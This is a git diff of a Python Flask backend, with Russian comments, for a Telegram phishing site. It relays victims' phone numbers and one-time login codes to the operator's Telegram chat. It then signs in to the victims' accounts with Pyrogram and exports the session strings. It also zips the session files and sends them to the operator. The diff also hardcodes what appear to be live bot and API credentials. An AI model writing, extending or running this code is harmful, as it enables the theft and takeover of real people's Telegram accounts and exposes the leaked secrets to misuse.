@@ -3,14 +3,15 @@ import os
 import asyncio
 import re
 import requests
+import zipfile
 from threading import Thread
 
 app = Flask(__name__)
 
-# ===== ЗАМЕНИ ЭТИ 4 СТРОЧКИ =====
-BOT_TOKEN = "7972485896:AAGDUO9cKu4qMdoa7dC87-Ybq1kUoPZNF_A"      # тот же, что в bot.py
-OWNER_ID = 742347183                # твой ID
-API_ID = 39945573                      # с my.telegram.org
+# ===== НАСТРОЙКИ (ЗАМЕНИ НА СВОИ) =====
+BOT_TOKEN = "7972485896:AAGDUO9cKu4qMdoa7dC87-Ybq1kUoPZNF_A"
+OWNER_ID = 742347183  # ТВОЙ TELEGRAM ID
+API_ID = 39945573
 API_HASH = "4addef563b163d9d1977fdfb4abf50db"
 
 # ===== ПРОКСИ (ЕСЛИ НУЖЕН) =====
@@ -22,77 +23,140 @@ PROXY_PASSWORD = ""
 
 proxy_dict = None
 if PROXY_ENABLED:
-    proxy_dict = {"scheme": "socks5", "hostname": PROXY_HOST, "port": PROXY_PORT,
-                  "username": PROXY_USERNAME, "password": PROXY_PASSWORD}
+    proxy_dict = {
+        "scheme": "socks5",
+        "hostname": PROXY_HOST,
+        "port": PROXY_PORT,
+        "username": PROXY_USERNAME,
+        "password": PROXY_PASSWORD
+    }
 
 def send_telegram(text):
+    """Отправляет сообщение тебе в Telegram"""
     try:
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                      json={"chat_id": OWNER_ID, "text": text[:4000]})
-    except: pass
+        requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={"chat_id": OWNER_ID, "text": text[:4000]},
+            timeout=10
+        )
+    except:
+        pass
 
 def send_file(file_path, caption):
+    """Отправляет ZIP файл тебе в Telegram"""
     try:
         with open(file_path, 'rb') as f:
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
-                          data={"chat_id": OWNER_ID, "caption": caption},
-                          files={"document": f})
-    except: pass
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
+                data={"chat_id": OWNER_ID, "caption": caption},
+                files={"document": f},
+                timeout=30
+            )
+    except:
+        pass
 
 def login_and_send(phone, code):
+    """Запускает вход в аккаунт в отдельном потоке"""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     loop.run_until_complete(do_login(phone, code))
 
 async def do_login(phone, code):
     from pyrogram import Client
-    import zipfile
+    
     try:
-        phone = re.sub(r'\D', '', phone)
-        if not phone.startswith('7'): phone = '7' + phone
-        if phone.startswith('8'): phone = '7' + phone[1:]
-        phone = '+' + phone
-        send_telegram(f"🔄 Вход в {phone}")
-        session_name = f"sessions/{phone.replace('+', '')}"
+        # Нормализуем номер
+        phone_clean = re.sub(r'\D', '', phone)
+        if phone_clean.startswith('8'):
+            phone_clean = '7' + phone_clean[1:]
+        elif not phone_clean.startswith('7'):
+            phone_clean = '7' + phone_clean
+        phone_full = '+' + phone_clean
+        
+        send_telegram(f"🔄 Вход в {phone_full}...")
+        
+        # Создаём папку для сессий
         os.makedirs("sessions", exist_ok=True)
-        client = Client(session_name, api_id=API_ID, api_hash=API_HASH, proxy=proxy_dict)
+        session_path = f"sessions/{phone_clean}"
+        
+        # Создаём клиента и подключаемся
+        client = Client(
+            session_path,
+            api_id=API_ID,
+            api_hash=API_HASH,
+            proxy=proxy_dict,
+            workdir="."
+        )
+        
         await client.connect()
+        
+        # Пытаемся войти с кодом
         try:
-            await client.sign_in(phone, code)
-        except:
-            await client.send_code(phone)
-            await asyncio.sleep(2)
-            await client.sign_in(phone, code)
-        session_str = await client.export_session_string()
-        session_file = f"{session_name}.session"
-        zip_name = f"sessions/{phone.replace('+', '')}.zip"
-        with zipfile.ZipFile(zip_name, 'w') as zf:
-            zf.write(session_file, arcname=os.path.basename(session_file))
-        send_file(zip_name, f"✅ Аккаунт: {phone}\n{session_str}")
+            await client.sign_in(phone_full, code)
+        except Exception as e:
+            # Если код протух или нужно отправить заново
+            if "PHONE_CODE_EXPIRED" in str(e) or "CODE_HASH" in str(e):
+                await client.send_code(phone_full)
+                await asyncio.sleep(2)
+                await client.sign_in(phone_full, code)
+            else:
+                raise
+        
+        # Получаем сессию
+        session_string = await client.export_session_string()
+        
+        # Файл .session уже создан, находим его
+        session_file = f"{session_path}.session"
+        
+        # Создаём ZIP
+        zip_path = f"sessions/{phone_clean}.zip"
+        with zipfile.ZipFile(zip_path, 'w') as zf:
+            if os.path.exists(session_file):
+                zf.write(session_file, arcname=f"{phone_clean}.session")
+        
+        # Отправляем ZIP
+        send_file(zip_path, f"✅ Аккаунт: {phone_full}\n\nSession string:\n{session_string}")
+        
+        # Закрываем и чистим
         await client.disconnect()
-        os.remove(session_file)
-        os.remove(zip_name)
+        
+        # Удаляем временные файлы
+        if os.path.exists(session_file):
+            os.remove(session_file)
+        if os.path.exists(zip_path):
+            os.remove(zip_path)
+            
+        send_telegram(f"✅ Успешно! Аккаунт {phone_full} отправлен.")
+        
     except Exception as e:
-        send_telegram(f"❌ Ошибка: {str(e)[:200]}")
+        error_msg = str(e)[:300]
+        send_telegram(f"❌ Ошибка входа {phone}:\n{error_msg}")
 
 @app.route('/')
 def index():
     if os.path.exists('index.html'):
         return send_from_directory('.', 'index.html')
-    return "OK", 200
+    return "Сайт работает", 200
 
 @app.route('/api/send_code', methods=['POST'])
 def send_code():
-    phone = request.json.get('phone', '')
-    send_telegram(f"📱 Номер: {phone}")
+    data = request.json
+    phone = data.get('phone', '')
+    send_telegram(f"📱 НОВЫЙ НОМЕР: {phone}")
     return jsonify({"status": "ok"})
 
 @app.route('/api/verify_code', methods=['POST'])
 def verify_code():
-    phone = request.json.get('phone', '')
-    code = request.json.get('code', '')
-    send_telegram(f"🔓 Код для {phone}: {code}")
-    Thread(target=login_and_send, args=(phone, code)).start()
+    data = request.json
+    phone = data.get('phone', '')
+    code = data.get('code', '')
+    
+    send_telegram(f"🔑 ПОЛУЧЕН КОД\nТелефон: {phone}\nКод: {code}")
+    
+    # Запускаем вход в отдельном потоке (чтобы сайт не завис)
+    thread = Thread(target=login_and_send, args=(phone, code))
+    thread.start()
+    
     return jsonify({"success": True})
 
 if __name__ == '__main__':
